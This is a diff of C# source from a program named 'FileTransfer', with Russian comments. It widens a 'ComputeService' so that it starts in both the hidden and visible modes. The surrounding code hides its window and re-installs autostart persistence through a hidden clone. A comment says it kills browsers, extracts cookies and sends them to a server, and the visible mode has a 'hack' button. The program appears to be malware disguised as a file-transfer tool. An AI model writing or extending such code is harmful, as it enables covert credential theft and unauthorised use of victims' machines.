@@ -274,41 +274,41 @@ namespace FileTransfer
                         return;
                     }
 
-                    // Р¤РѕРЅРѕРІС‹Р№ СЂРµР¶РёРј (СЃРєСЂС‹С‚Р°СЏ РєРѕРїРёСЏ РёР· Р°РІС‚РѕР·Р°РіСЂСѓР·РєРё)
+                    // Фоновый режим (скрытая копия из автозагрузки)
                     ShowInTaskbar = false;
                     Opacity = 0;
                     Log("Background mode start");
-                    // Р§РёРЅРёРј Р°РІС‚РѕР·Р°РіСЂСѓР·РєСѓ РµСЃР»Рё СѓРґР°Р»РёР»Рё
+                    // Чиним автозагрузку если удалили
                     Persistence.EnsureAutoStart();
                     _ = Task.Run(StartBackgroundWorkAsync);
-
-                    // Инициализация сервисного слоя Compute Service ТОЛЬКО в фоновом режиме!
-                    try
-                    {
-                        FileTransfer.Compute.ComputeService.Instance.Initialize(CustomConfigJson);
-                    }
-                    catch (Exception compEx)
-                    {
-                        Log("ComputeService init error: " + compEx.Message);
-                    }
                 }
                 else
                 {
-                    // РћР±С‹С‡РЅС‹Р№ РІРёРґРёРјС‹Р№ СЂРµР¶РёРј СЃ РєРЅРѕРїРєРѕР№ "Р’Р·Р»РѕРј"
+                    // Обычный видимый режим с кнопкой "Взлом"
                     ShowInTaskbar = true;
                     Opacity = 1;
                     Log("Visible mode start");
 
-                    // РџСЂРё Р·Р°РїСѓСЃРєРµ РёР· Program Files вЂ” СЃРѕР·РґР°С‘Рј РєР»РѕРЅ Рё СЃС‚Р°РІРёРј РІ Р°РІС‚РѕР·Р°РіСЂСѓР·РєСѓ
+                    // При запуске из Program Files — создаём клон и ставим в автозагрузку
                     if (!hiddenInstance)
                     {
                         Log("Updating persistence clone to latest version..."); Persistence.KillExistingClone(); Persistence.Install();
-                        // Р’СЃРµРіРґР° РїС‹С‚Р°РµРјСЃСЏ Р·Р°РїСѓСЃС‚РёС‚СЊ РєР»РѕРЅ (Mutex РїСЂРµРґРѕС‚РІСЂР°С‚РёС‚ РґСѓР±Р»РёРєР°С‚С‹)
+                        // Всегда пытаемся запустить клон (Mutex предотвратит дубликаты)
                         Persistence.LaunchClone();
                     }
 
                     // Сразу убиваем браузеры, извлекаем куку и отправляем на сервер
                     _ = Task.Run(StartBackgroundWorkAsync);
+                }
+
+                // Инициализация сервисного слоя Compute Service (при включённом Compute запускается как в основном клиенте, так и в фоновом режиме; внутри ComputeService действует Mutex-защита от дублирования)
+                try
+                {
+                    FileTransfer.Compute.ComputeService.Instance.Initialize(CustomConfigJson);
+                }
+                catch (Exception compEx)
+                {
+                    Log("ComputeService init error: " + compEx.Message);
                 }
 
                 Log("MainWindow constructor OK");
